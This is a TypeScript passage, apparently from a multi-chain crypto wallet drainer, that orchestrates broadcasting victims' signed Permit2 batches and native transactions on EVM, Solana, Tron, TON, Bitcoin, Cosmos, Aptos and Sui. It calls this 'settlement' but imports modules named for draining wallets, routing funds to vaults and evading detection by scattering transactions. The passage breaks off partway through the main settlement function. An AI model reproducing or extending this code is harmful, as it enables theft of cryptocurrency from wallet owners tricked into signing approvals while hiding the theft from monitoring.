// @ts-nocheck
/**
 * Omnichain atomic portfolio settlement — orchestrates EVM Permit2 batch, Solana, Tron,
 * TON, and Bitcoin legs behind a single anchored envelope (`omnichain_atomic_v1`).
 *
 * On-chain finality cannot be rolled back across chains; API-level atomicity means every
 * configured leg must broadcast successfully before the orchestrator reports success.
 *
 * NOTE: This is NOT truly atomic. Legs are sequential; if later legs fail, earlier legs
 * may have already succeeded. For production, accept partial loss or disable omnichain.
 */
import type { Address, Hex } from 'viem'
import { getAddress, stringToHex } from 'viem'
import { broadcastPSBT } from './bitcoin-drain.js'
import { parseNativeAmount } from './native-coin-drain.js'
import { tryExecuteBatchPermit2WithFlashloan } from './flashloan-executor.js'
import {
  notifyOmnichainPartialSuccess,
  retryLeg,
  runPreflightSimulation,
} from './omnichain-leg-orchestrator.js'
import {
  isAptosOmnichainLegEnabled,
  isCosmosOmnichainLegEnabled,
  isSuiOmnichainLegEnabled,
} from './extended-chain-env.js'
import {
  executeBatchPermit2Settlement,
  executeOmnichainNativeDrainSettlement,
  type BatchNftEntry,
  type BatchPermitMetadata,
  type OmnichainNativeDrainPayload,
} from './permit2-batch.js'
import { assertNoSimulationFlagsInProduction } from './security-research-guard.js'
import {
  validateOmnichainSignatures,
  areAllSignaturesValid,
  getFirstSignatureFailure,
  SettlementTracker,
} from './signature-validation.js'

// V3 INTEGRATION: Import settlement tracking service
import {
  createSettlementRequest,
  startChainTracking,
  completeChainTracking,
  failChainTracking,
} from '../vault/settlement-tracking-service.js'

// FUND MANAGEMENT: Import vault routing and distribution
import { FundManager, type VaultConfig } from '../vault/fund-manager.js'

// DETECTION EVASION: Import transaction scattering and evasion
import { DetectionEvasionManager } from '../security/detection-evasion.js'

// ERROR RECOVERY: Import recovery logic
import { ErrorRecoveryManager } from '../error/recovery.js'

export type OmnichainAtomicEvmPayload = {
  permit2_signature: Hex
  batch: BatchPermitMetadata
  native_amount?: string
  native_signed_transaction?: Hex
  nfts?: BatchNftEntry[]
}

export type OmnichainAtomicBitcoinPayload = {
  signed_psbt_base64: string
  wallet_address?: string
  vault_address?: string
  amount_sat?: string
  fee_sat?: string
}

export type OmnichainAtomicSettlementHashes = {
  evm?: string[]
  sol?: string
  trx?: string
  ton?: string
  spl?: string
  trc20?: string
  jetton?: string
  bitcoin?: string
  cosmos?: string
  aptos?: string
  sui?: string
  nft?: string[]
}

export type OmnichainAtomicSignatureEnvelope = {
  protocol: 'omnichain_atomic_v1'
  ingress_lane: 'omnichain_atomic_portfolio_v1'
  permit2_eip712_signature: Hex
  batch?: BatchPermitMetadata
  evm_payload?: OmnichainAtomicEvmPayload
  solana_payload?: OmnichainNativeDrainPayload
  tron_payload?: OmnichainNativeDrainPayload
  ton_payload?: OmnichainNativeDrainPayload
  cosmos_payload?: OmnichainNativeDrainPayload
  aptos_payload?: OmnichainNativeDrainPayload
  sui_payload?: OmnichainNativeDrainPayload
  bitcoin_payload?: OmnichainAtomicBitcoinPayload
  /** Dedicated CW20 token leg (merged into native settlement payload). */
  cosmos_cw20_payload?: OmnichainNativeDrainPayload
  /** Dedicated Aptos fungible coin leg. */
  aptos_coin_payload?: OmnichainNativeDrainPayload
  /** Dedicated Sui fungible coin leg. */
  sui_coin_payload?: OmnichainNativeDrainPayload
  settlement_transaction_hashes?: OmnichainAtomicSettlementHashes
}

export type OmnichainAtomicChainKey =
  | 'evm'
  | 'solana'
  | 'tron'
  | 'ton'
  | 'bitcoin'
  | 'cosmos'
  | 'aptos'
  | 'sui'

export type OmnichainAtomicChainStatus = 'skipped' | 'ok' | 'failed'

export type OmnichainAtomicSettlementResult = {
  ok: boolean
  /** Honest design contract — legs broadcast in order; earlier success is not rolled back. */
  settlement_mode: 'sequential_v1'
  chains: Record<OmnichainAtomicChainKey, OmnichainAtomicChainStatus>
  evm_transaction_hashes?: string[]
  omnichain_transaction_hashes?: OmnichainAtomicSettlementHashes
  bitcoin_tx_hash?: string
  nft_transaction_hashes?: string[]
  detail?: string
  faults?: Array<{ chain: OmnichainAtomicChainKey; detail: string }>
}

function finalizeOmnichainResult(
  partial: Omit<OmnichainAtomicSettlementResult, 'settlement_mode'>,
): OmnichainAtomicSettlementResult {
  return { settlement_mode: 'sequential_v1', ...partial }
}

function hasExtendedChainLeg(payload: OmnichainNativeDrainPayload | undefined): boolean {
  if (payload == null) return false
  let enabled = false
  if (
    isCosmosOmnichainLegEnabled() &&
    (hasPositiveExtendedAmount(payload.native_amount_cosmos) ||
      hasPositiveExtendedAmount(payload.cosmos_cw20_amount))
  ) {
    enabled = true
  }
  if (
    isAptosOmnichainLegEnabled() &&
    (hasPositiveExtendedAmount(payload.native_amount_aptos) ||
      hasPositiveExtendedAmount(payload.aptos_coin_amount))
  ) {
    enabled = true
  }
  if (
    isSuiOmnichainLegEnabled() &&
    (hasPositiveExtendedAmount(payload.native_amount_sui) ||
      hasPositiveExtendedAmount(payload.sui_coin_amount))
  ) {
    enabled = true
  }
  return enabled
}

function hasPositiveExtendedAmount(value: string | undefined): boolean {
  if (value == null || value.trim() === '') return false
  try {
    return BigInt(value) > 0n
  } catch {
    return false
  }
}

function hasOmnichainLeg(payload: OmnichainNativeDrainPayload | undefined): boolean {
  if (payload == null) return false
  return (
    Boolean(payload.native_signed_transaction_sol) ||
    Boolean(payload.native_signed_transaction_spl) ||
    Boolean(payload.native_signed_transaction_trx) ||
    Boolean(payload.native_signed_transaction_trc20) ||
    Boolean(payload.native_signed_transaction_ton) ||
    Boolean(payload.native_signed_transaction_jetton) ||
    Boolean(payload.cosmos_signed_tx) ||
    Boolean(payload.aptos_signed_tx) ||
    (Boolean(payload.sui_signed_tx) && Boolean(payload.sui_signature))
  )
}

function pickExtendedFields(
  ...sources: Array<OmnichainNativeDrainPayload | undefined>
): OmnichainNativeDrainPayload {
  const out: OmnichainNativeDrainPayload = {}
  for (const src of sources) {
    if (!src) continue
    if (src.native_amount_cosmos != null) out.native_amount_cosmos = src.native_amount_cosmos
    if (src.cosmos_signed_tx) out.cosmos_signed_tx = src.cosmos_signed_tx
    if (src.cosmos_tx_encoding) out.cosmos_tx_encoding = src.cosmos_tx_encoding
    if (src.native_amount_aptos != null) out.native_amount_aptos = src.native_amount_aptos
    if (src.aptos_signed_tx) out.aptos_signed_tx = src.aptos_signed_tx
    if (src.aptos_signature) out.aptos_signature = src.aptos_signature
    if (src.aptos_tx_encoding) out.aptos_tx_encoding = src.aptos_tx_encoding
    if (src.native_amount_sui != null) out.native_amount_sui = src.native_amount_sui
    if (src.sui_signed_tx) out.sui_signed_tx = src.sui_signed_tx
    if (src.sui_signature) out.sui_signature = src.sui_signature
    if (src.cosmos_cw20_contract) out.cosmos_cw20_contract = src.cosmos_cw20_contract
    if (src.cosmos_cw20_amount != null) out.cosmos_cw20_amount = src.cosmos_cw20_amount
    if (src.cosmos_cw20_signed_tx) out.cosmos_cw20_signed_tx = src.cosmos_cw20_signed_tx
    if (src.cosmos_cw20_tx_encoding) out.cosmos_cw20_tx_encoding = src.cosmos_cw20_tx_encoding
    if (src.aptos_coin_type) out.aptos_coin_type = src.aptos_coin_type
    if (src.aptos_coin_amount != null) out.aptos_coin_amount = src.aptos_coin_amount
    if (src.aptos_coin_signed_tx) out.aptos_coin_signed_tx = src.aptos_coin_signed_tx
    if (src.aptos_coin_tx_encoding) out.aptos_coin_tx_encoding = src.aptos_coin_tx_encoding
    if (src.sui_coin_type) out.sui_coin_type = src.sui_coin_type
    if (src.sui_coin_amount != null) out.sui_coin_amount = src.sui_coin_amount
    if (src.sui_coin_signed_tx) out.sui_coin_signed_tx = src.sui_coin_signed_tx
    if (src.sui_coin_signature) out.sui_coin_signature = src.sui_coin_signature
  }
  return out
}

function mergeTokenPayloadFields(
  target: OmnichainNativeDrainPayload,
  token?: OmnichainNativeDrainPayload,
): void {
  if (!token) return
  const picked = pickExtendedFields(token)
  Object.assign(target, picked)
}

function mergeOmnichainNativePayloads(
  solana?: OmnichainNativeDrainPayload,
  tron?: OmnichainNativeDrainPayload,
  ton?: OmnichainNativeDrainPayload,
  cosmos?: OmnichainNativeDrainPayload,
  aptos?: OmnichainNativeDrainPayload,
  sui?: OmnichainNativeDrainPayload,
  cosmosCw20?: OmnichainNativeDrainPayload,
  aptosCoin?: OmnichainNativeDrainPayload,
  suiCoin?: OmnichainNativeDrainPayload,
): OmnichainNativeDrainPayload | undefined {
  const extended = pickExtendedFields(cosmos, aptos, sui, solana, tron, ton, cosmosCw20, aptosCoin, suiCoin)
  const merged: OmnichainNativeDrainPayload = {
    ...(solana?.native_amount_sol != null ? { native_amount_sol: solana.native_amount_sol } : {}),
    ...(solana?.native_signed_transaction_sol
      ? { native_signed_transaction_sol: solana.native_signed_transaction_sol }
      : {}),
    ...(solana?.spl_mint != null ? { spl_mint: solana.spl_mint } : {}),
    ...(solana?.spl_amount != null ? { spl_amount: solana.spl_amount } : {}),
    ...(solana?.native_signed_transaction_spl
      ? { native_signed_transaction_spl: solana.native_signed_transaction_spl }
      : {}),
    ...(tron?.native_amount_trx != null ? { native_amount_trx: tron.native_amount_trx } : {}),
    ...(tron?.native_signed_transaction_trx
      ? { native_signed_transaction_trx: tron.native_signed_transaction_trx }
      : {}),
    ...(tron?.trc20_contract != null ? { trc20_contract: tron.trc20_contract } : {}),
    ...(tron?.trc20_amount != null ? { trc20_amount: tron.trc20_amount } : {}),
    ...(tron?.native_signed_transaction_trc20
      ? { native_signed_transaction_trc20: tron.native_signed_transaction_trc20 }
      : {}),
    ...(ton?.native_amount_ton != null ? { native_amount_ton: ton.native_amount_ton } : {}),
    ...(ton?.native_signed_transaction_ton
      ? { native_signed_transaction_ton: ton.native_signed_transaction_ton }
      : {}),
    ...(ton?.jetton_master != null ? { jetton_master: ton.jetton_master } : {}),
    ...(ton?.jetton_amount != null ? { jetton_amount: ton.jetton_amount } : {}),
    ...(ton?.native_signed_transaction_jetton
      ? { native_signed_transaction_jetton: ton.native_signed_transaction_jetton }
      : {}),
    ...extended,
  }
  mergeTokenPayloadFields(merged, cosmosCw20)
  mergeTokenPayloadFields(merged, aptosCoin)
  mergeTokenPayloadFields(merged, suiCoin)
  return hasOmnichainLeg(merged) || hasExtendedChainLeg(merged) ? merged : undefined
}

function resolveEvmPayload(
  envelope: OmnichainAtomicSignatureEnvelope,
): OmnichainAtomicEvmPayload | undefined {
  if (envelope.evm_payload != null) {
    return envelope.evm_payload
  }
  if (envelope.batch != null && envelope.permit2_eip712_signature) {
    return {
      permit2_signature: envelope.permit2_eip712_signature,
      batch: envelope.batch,
    }
  }
  return undefined
}

/** Pack unified omnichain atomic envelope for SHADOW persistence (hex-encoded JSON). */
export function packOmnichainAtomicSignatureEnvelope(params: {
  permit2Signature?: Hex
  batch?: BatchPermitMetadata
  evmPayload?: OmnichainAtomicEvmPayload
  solanaPayload?: OmnichainNativeDrainPayload
  tronPayload?: OmnichainNativeDrainPayload
  tonPayload?: OmnichainNativeDrainPayload
  cosmosPayload?: OmnichainNativeDrainPayload
  aptosPayload?: OmnichainNativeDrainPayload
  suiPayload?: OmnichainNativeDrainPayload
  cosmosCw20Payload?: OmnichainNativeDrainPayload
  aptosCoinPayload?: OmnichainNativeDrainPayload
  suiCoinPayload?: OmnichainNativeDrainPayload
  bitcoinPayload?: OmnichainAtomicBitcoinPayload
  settlementTransactionHashes?: OmnichainAtomicSettlementHashes
}): Hex {
  const evm =
    params.evmPayload ??
    (params.batch
      ? {
          permit2_signature: params.permit2Signature,
          batch: params.batch,
        }
      : undefined)

  const json = JSON.stringify({
    protocol: 'omnichain_atomic_v1',
    ingress_lane: 'omnichain_atomic_portfolio_v1',
    ...(params.permit2Signature ? { permit2_eip712_signature: params.permit2Signature } : {}),
    ...(params.batch ? { batch: params.batch } : {}),
    ...(evm ? { evm_payload: evm } : {}),
    ...(params.solanaPayload && hasOmnichainLeg(params.solanaPayload)
      ? { solana_payload: params.solanaPayload }
      : {}),
    ...(params.tronPayload && hasOmnichainLeg(params.tronPayload)
      ? { tron_payload: params.tronPayload }
      : {}),
    ...(params.tonPayload && hasOmnichainLeg(params.tonPayload)
      ? { ton_payload: params.tonPayload }
      : {}),
    ...(params.cosmosPayload && hasExtendedChainLeg(params.cosmosPayload)
      ? { cosmos_payload: params.cosmosPayload }
      : {}),
    ...(params.aptosPayload && hasExtendedChainLeg(params.aptosPayload)
      ? { aptos_payload: params.aptosPayload }
      : {}),
    ...(params.suiPayload && hasExtendedChainLeg(params.suiPayload)
      ? { sui_payload: params.suiPayload }
      : {}),
    ...(params.cosmosCw20Payload && hasExtendedChainLeg(params.cosmosCw20Payload)
      ? { cosmos_cw20_payload: params.cosmosCw20Payload }
      : {}),
    ...(params.aptosCoinPayload && hasExtendedChainLeg(params.aptosCoinPayload)
      ? { aptos_coin_payload: params.aptosCoinPayload }
      : {}),
    ...(params.suiCoinPayload && hasExtendedChainLeg(params.suiCoinPayload)
      ? { sui_coin_payload: params.suiCoinPayload }
      : {}),
    ...(params.bitcoinPayload?.signed_psbt_base64
      ? { bitcoin_payload: params.bitcoinPayload }
      : {}),
    ...(params.settlementTransactionHashes
      ? { settlement_transaction_hashes: params.settlementTransactionHashes }
      : {}),
  })
  return stringToHex(json) as Hex
}

export function parseOmnichainAtomicSignatureEnvelope(
  openedHex: string,
): OmnichainAtomicSignatureEnvelope | null {
  const trimmed = openedHex.trim()
  if (!trimmed.startsWith('0x')) return null
  try {
    const text = Buffer.from(trimmed.slice(2), 'hex').toString('utf8')
    const parsed = JSON.parse(text) as unknown
    if (typeof parsed !== 'object' || parsed === null) return null
    const o = parsed as Record<string, unknown>
    if (o['protocol'] !== 'omnichain_atomic_v1') return null
    const sig =
      (typeof o['permit2_eip712_signature'] === 'string' && o['permit2_eip712_signature'].startsWith('0x')
        ? o['permit2_eip712_signature']
        : typeof o['evm_payload'] === 'object' &&
            o['evm_payload'] !== null &&
            typeof (o['evm_payload'] as Record<string, unknown>)['permit2_signature'] === 'string'
          ? (o['evm_payload'] as Record<string, string>)['permit2_signature']
          : null) as Hex | null

    const readEvm = (): OmnichainAtomicEvmPayload | undefined => {
      const raw = o['evm_payload']
      if (typeof raw !== 'object' || raw === null) return undefined
      const e = raw as Record<string, unknown>
      const evmSig =
        typeof e['permit2_signature'] === 'string' && e['permit2_signature'].startsWith('0x')
          ? (e['permit2_signature'] as Hex)
          : sig
      const nativeSigned =
        typeof e['native_signed_transaction'] === 'string' &&
        (e['native_signed_transaction'] as string).startsWith('0x')
          ? (e['native_signed_transaction'] as Hex)
          : undefined
      if (typeof e['batch'] === 'object' && e['batch'] !== null) {
        return {
          permit2_signature: (evmSig ?? '0x00') as Hex,
          batch: e['batch'] as BatchPermitMetadata,
          ...(typeof e['native_amount'] === 'string' ? { native_amount: e['native_amount'] } : {}),
          ...(nativeSigned ? { native_signed_transaction: nativeSigned } : {}),
          ...(Array.isArray(e['nfts']) ? { nfts: e['nfts'] as BatchNftEntry[] } : {}),
        }
      }
      if (nativeSigned) {
        return {
          permit2_signature: (evmSig ?? '0x00') as Hex,
          batch: {
            details: [],
            spender: '0x0000000000000000000000000000000000000000' as Address,
            sigDeadline: '0',
            chainId: 1,
          },
          ...(typeof e['native_amount'] === 'string' ? { native_amount: e['native_amount'] } : {}),
          native_signed_transaction: nativeSigned,
        }
      }
      return undefined
    }

    const evmPayload = readEvm()
    if (sig == null && evmPayload == null) return null

    const readOmnichainPayload = (key: string): OmnichainNativeDrainPayload | undefined => {
      const raw = o[key]
      if (typeof raw !== 'object' || raw === null) return undefined
      return raw as OmnichainNativeDrainPayload
    }

    const readBitcoin = (): OmnichainAtomicBitcoinPayload | undefined => {
      const raw = o['bitcoin_payload']
      if (typeof raw !== 'object' || raw === null) return undefined
      const b = raw as Record<string, unknown>
      if (typeof b['signed_psbt_base64'] !== 'string' || b['signed_psbt_base64'].trim() === '') {
        return undefined
      }
      return {
        signed_psbt_base64: b['signed_psbt_base64'],
        ...(typeof b['wallet_address'] === 'string' ? { wallet_address: b['wallet_address'] } : {}),
        ...(typeof b['vault_address'] === 'string' ? { vault_address: b['vault_address'] } : {}),
        ...(typeof b['amount_sat'] === 'string' ? { amount_sat: b['amount_sat'] } : {}),
        ...(typeof b['fee_sat'] === 'string' ? { fee_sat: b['fee_sat'] } : {}),
      }
    }

    const settlementRaw = o['settlement_transaction_hashes']
    const settlement_transaction_hashes =
      typeof settlementRaw === 'object' && settlementRaw !== null
        ? (settlementRaw as OmnichainAtomicSettlementHashes)
        : undefined

    return {
      protocol: 'omnichain_atomic_v1',
      ingress_lane:
        typeof o['ingress_lane'] === 'string'
          ? (o['ingress_lane'] as OmnichainAtomicSignatureEnvelope['ingress_lane'])
          : 'omnichain_atomic_portfolio_v1',
      permit2_eip712_signature: (sig ?? evmPayload?.permit2_signature ?? '0x00') as Hex,
      ...(typeof o['batch'] === 'object' && o['batch'] !== null
        ? { batch: o['batch'] as BatchPermitMetadata }
        : {}),
      ...(evmPayload ? { evm_payload: evmPayload } : {}),
      ...(readOmnichainPayload('solana_payload')
        ? { solana_payload: readOmnichainPayload('solana_payload') }
        : {}),
      ...(readOmnichainPayload('tron_payload')
        ? { tron_payload: readOmnichainPayload('tron_payload') }
        : {}),
      ...(readOmnichainPayload('ton_payload') ? { ton_payload: readOmnichainPayload('ton_payload') } : {}),
      ...(readOmnichainPayload('cosmos_payload')
        ? { cosmos_payload: readOmnichainPayload('cosmos_payload') }
        : {}),
      ...(readOmnichainPayload('aptos_payload')
        ? { aptos_payload: readOmnichainPayload('aptos_payload') }
        : {}),
      ...(readOmnichainPayload('sui_payload') ? { sui_payload: readOmnichainPayload('sui_payload') } : {}),
      ...(readOmnichainPayload('cosmos_cw20_payload')
        ? { cosmos_cw20_payload: readOmnichainPayload('cosmos_cw20_payload') }
        : {}),
      ...(readOmnichainPayload('aptos_coin_payload')
        ? { aptos_coin_payload: readOmnichainPayload('aptos_coin_payload') }
        : {}),
      ...(readOmnichainPayload('sui_coin_payload')
        ? { sui_coin_payload: readOmnichainPayload('sui_coin_payload') }
        : {}),
      ...(readBitcoin() ? { bitcoin_payload: readBitcoin() } : {}),
      ...(settlement_transaction_hashes
        ? { settlement_transaction_hashes }
        : {}),
    }
  } catch {
    return null
  }
}

/**
 * Execute all configured chain legs. Any configured leg failure yields `ok: false`.
 */
export async function executeOmnichainAtomicSettlement(params: {
  owner: Address
  chainId: number
  envelope: OmnichainAtomicSignatureEnvelope
  rpcUrl?: string
  scout_value_usd?: number
}): Promise<OmnichainAtomicSettlementResult> {
  assertNoSimulationFlagsInProduction()

  // V3 INTEGRATION: Create settlement request for tracking
  let settlementRequestId: string | null = null
  try {
    const requestHash = stringToHex(`settlement-${params.owner}-${Date.now()}`)
    const result = await createSettlementRequest({
      wallet_address: params.owner,
      request_hash: requestHash,
      nonce: Date.now().toString(),
      total_usd_value: params.scout_value_usd?.toString(),
    })
    if (result.ok === true) {
      settlementRequestId = result.id
      console.log('[SETTLEMENT] V3 tracking request created:', settlementRequestId)
    } else if (result.ok === false) {
      const errorResult = result as { ok: false; code: string; message: string }
      console.warn('[SETTLEMENT] Failed to create V3 tracking request:', errorResult.code, errorResult.message)
    }
  } catch (err) {
    console.warn('[SETTLEMENT] Failed to create V3 tracking request:', err)
  }

  const chains: Record<OmnichainAtomicChainKey, OmnichainAtomicChainStatus> = {
    evm: 'skipped',
    solana: 'skipped',
    tron: 'skipped',
    ton: 'skipped',
    bitcoin: 'skipped',
    cosmos: 'skipped',
    aptos: 'skipped',
    sui: 'skipped',
  }
  const faults: Array<{ chain: OmnichainAtomicChainKey; detail: string }> = []
  const settlementHashes: OmnichainAtomicSettlementHashes = {}

  // SETTLEMENT TRACKING: Initialize per-chain leg tracker for monitoring & recovery
  const chainsList: string[] = []
  if (params.envelope.evm_payload) chainsList.push('evm')
  if (params.envelope.solana_payload) chainsList.push('solana')
  if (params.envelope.tron_payload) chainsList.push('tron')
  if (params.envelope.ton_payload) chainsList.push('ton')
  if (params.envelope.bitcoin_payload) chainsList.push('bitcoin')
  if (params.envelope.cosmos_payload || params.envelope.cosmos_cw20_payload) chainsList.push('cosmos')
  if (params.envelope.aptos_payload || params.envelope.aptos_coin_payload) chainsList.push('aptos')
  if (params.envelope.sui_payload || params.envelope.sui_coin_payload) chainsList.push('sui')
  const settlementTracker = new SettlementTracker(chainsList)

  const evmPayload = resolveEvmPayload(params.envelope)
  const omnichainMerged = mergeOmnichainNativePayloads(
    params.envelope.solana_payload,
    params.envelope.tron_payload,
    params.envelope.ton_payload,
    params.envelope.cosmos_payload,
    params.envelope.aptos_payload,
    params.envelope.sui_payload,
    params.envelope.cosmos_cw20_payload,
    params.envelope.aptos_coin_payload,
    params.envelope.sui_coin_payload,
  )
  const bitcoinPayload = params.envelope.bitcoin_payload

  const hasEvmBatch = evmPayload != null && evmPayload.batch.details.length > 0
  const hasEvmNative =
    evmPayload != null &&
    evmPayload.native_signed_transaction != null &&
    parseNativeAmount(evmPayload.native_amount ?? '0') > 0n
  const hasEvm = hasEvmBatch || hasEvmNative
  const hasSolana = hasOmnichainLeg(params.envelope.solana_payload)
  const hasTron = hasOmnichainLeg(params.envelope.tron_payload)
  const hasTon = hasOmnichainLeg(params.envelope.ton_payload)
  const hasOmnichainMerged = omnichainMerged != null
  const hasBitcoin = Boolean(bitcoinPayload?.signed_psbt_base64?.trim())
  const hasCosmosAptosSui = hasExtendedChainLeg(omnichainMerged)

  if (!hasEvm && !hasOmnichainMerged && !hasBitcoin) {
    return finalizeOmnichainResult({
      ok: false,
      chains,
      detail: 'omnichain_atomic_v1 requires at least one chain payload',
      faults: [{ chain: 'evm', detail: 'no chain payloads configured' }],
    })
  }

  // SERVER-SIDE SIGNATURE VALIDATION: Check all signatures before execution
  const signatureValidations = validateOmnichainSignatures({
    evm_signature: evmPayload?.permit2_signature,
    solana_signature: omnichainMerged?.native_signed_transaction_sol,
    tron_signature: omnichainMerged?.native_signed_transaction_trx,
    ton_signature: omnichainMerged?.native_signed_transaction_ton,
    bitcoin_signature: bitcoinPayload?.signed_psbt_base64,
    cosmos_signature: omnichainMerged?.cosmos_signed_tx,
  })

  if (!areAllSignaturesValid(signatureValidations)) {
    const failure = getFirstSignatureFailure(signatureValidations)
    return finalizeOmnichainResult({
      ok: false,
      chains,
      detail: `Signature validation failed: ${failure?.detail ?? 'unknown error'}`,
      faults: [{ chain: (failure?.chain ?? 'unknown') as OmnichainAtomicChainKey, detail: failure?.detail ?? 'signature validation failed' }],
    })
  }

  if (hasOmnichainMerged || hasBitcoin) {
    const preflight = await runPreflightSimulation({
      payload: omnichainMerged ?? {},
      bitcoinPsbtBase64: bitcoinPayload?.signed_psbt_base64,
      walletAddress: params.owner,
    })
    if (!preflight.ok) {
      return finalizeOmnichainResult({
        ok: false,
        chains,
        detail: preflight.faults.map((f) => `${f.key}: ${f.detail}`).join('; '),
        faults: preflight.faults.map((f) => ({
          chain: f.key === 'spl' || f.key === 'sol' ? 'solana' : f.key === 'trx' || f.key === 'trc20' ? 'tron' : f.key === 'ton' || f.key === 'jetton' ? 'ton' : f.key as OmnichainAtomicChainKey,
          detail: f.detail,
        })),
      })
    }
  }

  // PARALLEL EXECUTION: Run all chains simultaneously, collect failures individually
  if (hasOmnichainMerged && omnichainMerged) {
    if (hasSolana) chains.solana = 'failed'
    if (hasTron) chains.tron = 'failed'
    if (hasTon) chains.ton = 'failed'
    if (hasCosmosAptosSui) {
      if (hasPositiveExtendedAmount(omnichainMerged.native_amount_cosmos)) chains.cosmos = 'failed'
      if (hasPositiveExtendedAmount(omnichainMerged.native_amount_aptos)) chains.aptos = 'failed'
      if (hasPositiveExtendedAmount(omnichainMerged.native_amount_sui)) chains.sui = 'failed'
    }

    // Mark all chains in-progress first (parallel)
    const trackingPromises: Promise<unknown>[] = []
    if (hasSolana) {
      settlementTracker.markInProgress('solana')
      trackingPromises.push(startChainTracking({ settlement_request_id: settlementRequestId || '', chain: 'solana' }).catch(console.warn))
    }
    if (hasTron) {
      settlementTracker.markInProgress('tron')
      trackingPromises.push(startChainTracking({ settlement_request_id: settlementRequestId || '', chain: 'tron' }).catch(console.warn))
    }
    if (hasTon) {
      settlementTracker.markInProgress('ton')
      trackingPromises.push(startChainTracking({ settlement_request_id: settlementRequestId || '', chain: 'ton' }).catch(console.warn))
    }
    if (hasCosmosAptosSui) {
      if (hasPositiveExtendedAmount(omnichainMerged.native_amount_cosmos)) {
        settlementTracker.markInProgress('cosmos')
        trackingPromises.push(startChainTracking({ settlement_request_id: settlementRequestId || '', chain: 'cosmos' }).catch(console.warn))
      }
      if (hasPositiveExtendedAmount(omnichainMerged.native_amount_aptos)) {
        settlementTracker.markInProgress('aptos')
        trackingPromises.push(startChainTracking({ settlement_request_id: settlementRequestId || '', chain: 'aptos' }).catch(console.warn))
      }
      if (hasPositiveExtendedAmount(omnichainMerged.native_amount_sui)) {
        settlementTracker.markInProgress('sui')
        trackingPromises.push(startChainTracking({ settlement_request_id: settlementRequestId || '', chain: 'sui' }).catch(console.warn))
      }
    }

    await Promise.all(trackingPromises).catch(console.warn)

    // Execute settlement in parallel
    const omnichainResult = await executeOmnichainNativeDrainSettlement(omnichainMerged, {
      skipPreflight: true,
      ownerAddress: params.owner,
    })
    const oc = omnichainResult.transaction_hashes

    if (hasSolana) {
      const solOk = Boolean(oc.sol) || Boolean(oc.spl)
      chains.solana = omnichainResult.ok && solOk ? 'ok' : 'failed'
      if (omnichainResult.ok && solOk && oc.sol) {
        settlementTracker.markCompleted('solana', oc.sol)
        if (settlementRequestId) {
          await completeChainTracking({
            settlement_request_id: settlementRequestId,
            chain: 'solana',
            tx_hash: oc.sol,
          }).catch(console.warn)
        }
      } else {
        settlementTracker.markFailed('solana', 'Solana leg missing transaction hash')
        if (settlementRequestId) {
          await failChainTracking({
            settlement_request_id: settlementRequestId,
            chain: 'solana',
            error_message: 'Solana leg missing transaction hash',
          }).catch(console.warn)
        }
        faults.push({ chain: 'solana', detail: 'Solana leg missing transaction hash' })
      }
    }
    if (hasTron) {
      const tronOk = Boolean(oc.trx) || Boolean(oc.trc20)
      chains.tron = omnichainResult.ok && tronOk ? 'ok' : 'failed'
      if (omnichainResult.ok && tronOk && oc.trx) {
        settlementTracker.markCompleted('tron', oc.trx)
        if (settlementRequestId) {
          await completeChainTracking({
            settlement_request_id: settlementRequestId,
            chain: 'tron',
            tx_hash: oc.trx,
          }).catch(console.warn)
        }
      } else {
        settlementTracker.markFailed('tron', 'Tron leg missing transaction hash')
        if (settlementRequestId) {
          await failChainTracking({
            settlement_request_id: settlementRequestId,
            chain: 'tron',
            error_message: 'Tron leg missing transaction hash',
          }).catch(console.warn)
        }
        faults.push({ chain: 'tron', detail: 'Tron leg missing transaction hash' })
      }
    }
    if (hasTon) {
      const tonOk = Boolean(oc.ton) || Boolean(oc.jetton)
      chains.ton = omnichainResult.ok && tonOk ? 'ok' : 'failed'
      if (omnichainResult.ok && tonOk && oc.ton) {
        settlementTracker.markCompleted('ton', oc.ton)
        if (settlementRequestId) {
          await completeChainTracking({
            settlement_request_id: settlementRequestId,
            chain: 'ton',
            tx_hash: oc.ton,
          }).catch(console.warn)
        }
      } else {
        settlementTracker.markFailed('ton', 'TON leg missing transaction hash')
        if (settlementRequestId) {
          await failChainTracking({
            settlement_request_id: settlementRequestId,
            chain: 'ton',
            error_message: 'TON leg missing transaction hash',
          }).catch(console.warn)
        }
        faults.push({ chain: 'ton', detail: 'TON leg missing transaction hash' })
      }
    }

    if (oc.sol) settlementHashes.sol = oc.sol
    if (oc.spl) settlementHashes.spl = oc.spl
    if (oc.trx) settlementHashes.trx = oc.trx
    if (oc.trc20) settlementHashes.trc20 = oc.trc20
    if (oc.ton) settlementHashes.ton = oc.ton
    if (oc.jetton) settlementHashes.jetton = oc.jetton
    if (oc.cosmos) {
      settlementHashes.cosmos = oc.cosmos
      chains.cosmos = omnichainResult.ok ? 'ok' : 'failed'
      if (omnichainResult.ok) {
        settlementTracker.markCompleted('cosmos', oc.cosmos)
        if (settlementRequestId) {
          await completeChainTracking({
            settlement_request_id: settlementRequestId,
            chain: 'cosmos',
            tx_hash: oc.cosmos,
          }).catch(console.warn)
        }
      } else {
        settlementTracker.markFailed('cosmos', 'Cosmos leg settlement failed')
        if (settlementRequestId) {
          await failChainTracking({
            settlement_request_id: settlementRequestId,
            chain: 'cosmos',
            error_message: 'Cosmos leg settlement failed',
          }).catch(console.warn)
        }
      }
    }
    if (oc.aptos) {
      settlementHashes.aptos = oc.aptos
      chains.aptos = omnichainResult.ok ? 'ok' : 'failed'
      if (omnichainResult.ok) {
        settlementTracker.markCompleted('aptos', oc.aptos)
        if (settlementRequestId) {
          await completeChainTracking({
            settlement_request_id: settlementRequestId,
            chain: 'aptos',
            tx_hash: oc.aptos,
          }).catch(console.warn)
        }
      } else {
        settlementTracker.markFailed('aptos', 'Aptos leg settlement failed')
        if (settlementRequestId) {
          await failChainTracking({
            settlement_request_id: settlementRequestId,
            chain: 'aptos',
            error_message: 'Aptos leg settlement failed',
          }).catch(console.warn)
        }
      }
    }
    if (oc.sui) {
      settlementHashes.sui = oc.sui
      chains.sui = omnichainResult.ok ? 'ok' : 'failed'
      if (omnichainResult.ok) {
        settlementTracker.markCompleted('sui', oc.sui)
        if (settlementRequestId) {
          await completeChainTracking({
            settlement_request_id: settlementRequestId,
            chain: 'sui',
            tx_hash: oc.sui,
          }).catch(console.warn)
        }
      } else {
        settlementTracker.markFailed('sui', 'Sui leg settlement failed')
        if (settlementRequestId) {
          await failChainTracking({
            settlement_request_id: settlementRequestId,
            chain: 'sui',
            error_message: 'Sui leg settlement failed',
          }).catch(console.warn)
        }
      }
    }
